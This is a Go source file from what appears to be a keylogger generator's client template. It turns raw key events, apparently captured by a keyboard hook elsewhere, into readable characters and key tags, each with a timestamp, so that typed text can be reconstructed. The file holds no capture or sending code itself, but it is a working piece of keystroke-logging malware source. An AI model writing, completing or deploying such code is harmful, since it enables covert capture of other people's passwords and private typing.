// GuiKeyStandaloneGo/generator/templates/client_template/keyboard_processing.go
package main

import (
	"fmt"
	"log" // For logger parameter type
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Windows API for key processing
// Ensure lazyModUser32 is accessible if these procs are used.
// If keyboard_windows.go and this file are separate and both need these,
// they should either share a global lazyModUser32 (defined in one place, e.g., main.go or a winapi_utils.go)
// or each initialize their own. For now, assuming it's available from where this is called,
// or that these specific procs will be initialized similarly to how they are in keyboard_windows.go if needed.
// For ToUnicode, we will use the one from keyboard_windows.go (lazyModUser32).
var (
	procGetKeyboardStateKeyProc = lazyModUser32.NewProc("GetKeyboardState") // Assuming lazyModUser32 is the one from keyboard_windows.go or similar
	procToUnicodeKeyProc        = lazyModUser32.NewProc("ToUnicode")
	// procMapVirtualKeyW // Not currently used, but can be added if needed
)

type ProcessedKeyEvent struct {
	OriginalRaw RawKeyData // Keep original for full context if needed
	KeyValue    string     // The character or key name (e.g., "A", "[ENTER]", "[CTRL]")
	IsChar      bool       // True if KeyValue is a printable character
	IsKeyDown   bool
	Timestamp   time.Time // Added timestamp from RawKeyData
}

// vkCodeToString attempts to convert a virtual key code to a string.
// It uses ToUnicode for characters and a map for special keys.
// This should be called from a regular Go goroutine, NOT from the hook procedure.
func vkCodeToString(vkCode uint32, scanCode uint32, flags uint32, isKeyDown bool, logger *log.Logger) (keyVal string, isChar bool) {
	var kbState [256]byte
	var charBuf [4]uint16

	ret, _, errState := syscall.SyscallN(procGetKeyboardStateKeyProc.Addr(), uintptr(unsafe.Pointer(&kbState[0])))
	if ret == 0 {
		if logger != nil {
			logger.Printf("VKPROC: GetKeyboardState failed: %v", errState)
		}
		return simpleVKMap(vkCode, logger), false // Pass logger
	}

	nChars, _, errUnicode := syscall.SyscallN(procToUnicodeKeyProc.Addr(),
		uintptr(vkCode),
		uintptr(scanCode),
		uintptr(unsafe.Pointer(&kbState[0])),
		uintptr(unsafe.Pointer(&charBuf[0])),
		uintptr(len(charBuf)),
		0,
	)

	// syscall.Errno 0 means success for the syscall itself.
	// The return value nChars indicates translation status.
	if errUnicode != 0 && logger != nil { // Log if syscall.Errno is non-zero
		logger.Printf("VKPROC: ToUnicode syscall returned errno: %v", errUnicode)
	}

	if nChars > 0 {
		return windows.UTF16ToString(charBuf[:nChars]), true
	} else if int(nChars) == -1 {
		// Dead key, often better to ignore for typed text or handle specially.
		// For now, map it as a special key.
		if logger != nil {
			logger.Printf("VKPROC: Detected dead key for VK=0x%X", vkCode)
		}
		return simpleVKMap(vkCode, logger), false // Pass logger
	} else { // nChars == 0, no translation
		return simpleVKMap(vkCode, logger), false // Pass logger
	}
}

// simpleVKMap provides a basic mapping for non-character keys.
func simpleVKMap(vkCode uint32, logger *log.Logger) string { // Accept logger (though not used much here yet)
	switch vkCode {
	case windows.VK_BACK:
		return "[BACKSPACE]"
	case windows.VK_TAB:
		return "[TAB]"
	case windows.VK_RETURN:
		return "[ENTER]"
	case windows.VK_SHIFT, windows.VK_LSHIFT, windows.VK_RSHIFT:
		return "[SHIFT]"
	case windows.VK_CONTROL, windows.VK_LCONTROL, windows.VK_RCONTROL:
		return "[CTRL]"
	case windows.VK_MENU, windows.VK_LMENU, windows.VK_RMENU:
		return "[ALT]" // ALT
	case windows.VK_PAUSE:
		return "[PAUSE]"
	case windows.VK_CAPITAL:
		return "[CAPSLOCK]"
	case windows.VK_ESCAPE:
		return "[ESC]"
	case windows.VK_SPACE:
		return " " // ToUnicode should handle this, but good fallback
	case windows.VK_PRIOR:
		return "[PAGEUP]"
	case windows.VK_NEXT:
		return "[PAGEDOWN]"
	case windows.VK_END:
		return "[END]"
	case windows.VK_HOME:
		return "[HOME]"
	case windows.VK_LEFT:
		return "[LEFT]"
	case windows.VK_UP:
		return "[UP]"
	case windows.VK_RIGHT:
		return "[RIGHT]"
	case windows.VK_DOWN:
		return "[DOWN]"
	case windows.VK_INSERT:
		return "[INSERT]"
	case windows.VK_DELETE:
		return "[DELETE]"
	case windows.VK_LWIN, windows.VK_RWIN:
		return "[WIN]"
	case windows.VK_APPS:
		return "[APPS]"
	case windows.VK_SNAPSHOT:
		return "[PRINTSCREEN]"
	case windows.VK_NUMLOCK:
		return "[NUMLOCK]"
	case windows.VK_SCROLL:
		return "[SCROLLLOCK]"
	case windows.VK_F1:
		return "[F1]"
	case windows.VK_F2:
		return "[F2]"
	case windows.VK_F3:
		return "[F3]"
	case windows.VK_F4:
		return "[F4]"
	case windows.VK_F5:
		return "[F5]"
	case windows.VK_F6:
		return "[F6]"
	case windows.VK_F7:
		return "[F7]"
	case windows.VK_F8:
		return "[F8]"
	case windows.VK_F9:
		return "[F9]"
	case windows.VK_F10:
		return "[F10]"
	case windows.VK_F11:
		return "[F11]"
	case windows.VK_F12:
		return "[F12]"
	case windows.VK_OEM_1:
		return ";" // Often ;:
	case windows.VK_OEM_PLUS:
		return "="
	case windows.VK_OEM_COMMA:
		return ","
	case windows.VK_OEM_MINUS:
		return "-"
	case windows.VK_OEM_PERIOD:
		return "."
	case windows.VK_OEM_2:
		return "/" // Often /?
	case windows.VK_OEM_3:
		return "`" // Often `~
	case windows.VK_OEM_4:
		return "[" // Often [{
	case windows.VK_OEM_5:
		return "\\" // Often \|
	case windows.VK_OEM_6:
		return "]" // Often ]}
	case windows.VK_OEM_7:
		return "'" // Often '"
	// Numpad characters are usually handled by ToUnicode if NumLock is on
	case windows.VK_NUMPAD0:
		return "[NUM0]"
	case windows.VK_NUMPAD1:
		return "[NUM1]"
	case windows.VK_NUMPAD2:
		return "[NUM2]"
	case windows.VK_NUMPAD3:
		return "[NUM3]"
	case windows.VK_NUMPAD4:
		return "[NUM4]"
	case windows.VK_NUMPAD5:
		return "[NUM5]"
	case windows.VK_NUMPAD6:
		return "[NUM6]"
	case windows.VK_NUMPAD7:
		return "[NUM7]"
	case windows.VK_NUMPAD8:
		return "[NUM8]"
	case windows.VK_NUMPAD9:
		return "[NUM9]"
	case windows.VK_MULTIPLY:
		return "[NUM*]"
	case windows.VK_ADD:
		return "[NUM+]"
	case windows.VK_SUBTRACT:
		return "[NUM-]"
	case windows.VK_DECIMAL:
		return "[NUM.]"
	case windows.VK_DIVIDE:
		return "[NUM/]"
	default:
		if logger != nil {
			// logger.Printf("VKPROC: Unmapped VK Code: 0x%X", vkCode) // Can be noisy
		}
		return fmt.Sprintf("[VK_0x%X]", vkCode)
	}
}

// This function will be run in a goroutine to process raw key data
func processRawKeyEvents(rawKeyIn <-chan RawKeyData, processedKeyOut chan<- ProcessedKeyEvent, quit <-chan struct{}, logger *log.Logger) {
	if logger != nil {
		logger.Println("Key event processing goroutine started.")
	}

	for {
		select {
		case rawEvent, ok := <-rawKeyIn:
			if !ok {
				if logger != nil {
					logger.Println("Raw key input channel closed. Key processor stopping.")
				}
				return
			}

			keyValue, isChar := vkCodeToString(rawEvent.VkCode, rawEvent.ScanCode, rawEvent.Flags, rawEvent.IsKeyDown, logger) // Pass logger

			processedKeyOut <- ProcessedKeyEvent{
				OriginalRaw: rawEvent,
				KeyValue:    keyValue,
				IsChar:      isChar,
				IsKeyDown:   rawEvent.IsKeyDown,
				Timestamp:   rawEvent.Timestamp, // Carry over the timestamp
			}

		case <-quit:
			if logger != nil {
				logger.Println("Key event processing goroutine stopping.")
			}
			return
		}
	}
}
